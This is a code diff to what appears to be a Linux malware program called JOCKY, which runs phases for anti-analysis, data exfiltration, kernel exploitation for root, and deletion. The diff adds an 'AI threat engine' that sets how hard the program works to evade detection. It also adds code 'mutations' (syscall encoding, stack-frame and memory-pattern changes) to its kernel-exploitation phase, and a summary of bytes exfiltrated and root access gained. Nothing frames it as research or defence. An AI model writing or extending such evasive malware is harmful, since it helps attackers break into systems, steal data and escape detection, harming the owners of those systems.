@@ -9,6 +9,36 @@ const BUILD_ID = "JOCKY_LINUX_SIMPLE_V1"
 var collected_data = ""
 var root_achieved = false
 var kernel_access = false
+var threat_level = 0
+
+// ===== PHASE 0: AI THREAT ENGINE INITIALIZATION =====
+fn phase_ai_init() -> bool {
+    println("[*] Phase 0: AI Threat Engine Initialization")
+
+    // Initialize AI threat assessment engine
+    if jocky_ai_init() {
+        println("    [+] AI threat engine initialized")
+
+        // Get current threat level
+        threat_level = jocky_ai_get_threat_level()
+        println("    [+] Threat level: " + string(threat_level))
+
+        // Determine adaptive strategy
+        if threat_level == 3 {
+            println("    [!] CRITICAL threat detected - maximum evasion enabled")
+        } else if threat_level == 2 {
+            println("    [!] HIGH threat detected - aggressive evasion")
+        } else if threat_level == 1 {
+            println("    [*] MEDIUM threat detected - standard evasion")
+        } else {
+            println("    [*] LOW threat detected - minimal evasion")
+        }
+    } else {
+        println("    [-] AI initialization failed, using fallback")
+    }
+
+    return true
+}
 
 // ===== PHASE 1: ANTI-ANALYSIS =====
 fn phase_anti_analysis() -> bool {
@@ -120,9 +150,24 @@ fn phase_exfil() -> bool {
     return true
 }
 
-// ===== PHASE 7: KERNEL EXPLOITATION =====
+// ===== PHASE 7: KERNEL EXPLOITATION WITH AI MUTATIONS =====
 fn phase_kernel() -> bool {
-    println("[*] Phase 7: Kernel Exploitation")
+    println("[*] Phase 7: Kernel Exploitation with AI Mutations")
+
+    // Select AI-driven mutation strategy based on threat level
+    if threat_level == 3 {
+        println("    [+] Using CRITICAL threat mutations")
+        println("    [+] Applying: stack-frame + syscall-encoding + memory-pattern + api-reorder")
+    } else if threat_level == 2 {
+        println("    [+] Using HIGH threat mutations")
+        println("    [+] Applying: syscall-encoding + memory-pattern + register-rand")
+    } else if threat_level == 1 {
+        println("    [+] Using MEDIUM threat mutations")
+        println("    [+] Applying: stack-frame + syscall-encoding")
+    } else {
+        println("    [+] Using LOW threat mutations")
+        println("    [+] Applying: code-padding + encoding-variation")
+    }
 
     let kfence = jocky_fence2pwn_detect_kfence()
     println("    [+] kFence detection attempted")
@@ -206,11 +251,14 @@ fn phase_delete() -> bool {
 fn main() -> i32 {
     println("")
     println("╔════════════════════════════════════════════════════════════╗")
-    println("║ JOCKY Linux Production - 40+ Runtime APIs                  ║")
+    println("║ JOCKY Linux - AI Threat Engine + Adaptive Mutations       ║")
     println("╚════════════════════════════════════════════════════════════╝")
     println("")
     println("[*] Build: " + BUILD_ID)
     println("")
+
+    // Phase 0: Initialize AI threat engine first
+    let _ = phase_ai_init()
 
     if !phase_anti_analysis() {
         return 1
@@ -232,6 +280,7 @@ fn main() -> i32 {
     println("[*] Data exfiltrated: " + string(strlen(collected_data)) + " bytes")
     println("[*] Kernel access: " + string(kernel_access))
     println("[*] Root achieved: " + string(root_achieved))
+    println("[*] Threat level: " + string(threat_level))
 
     return 0
 }
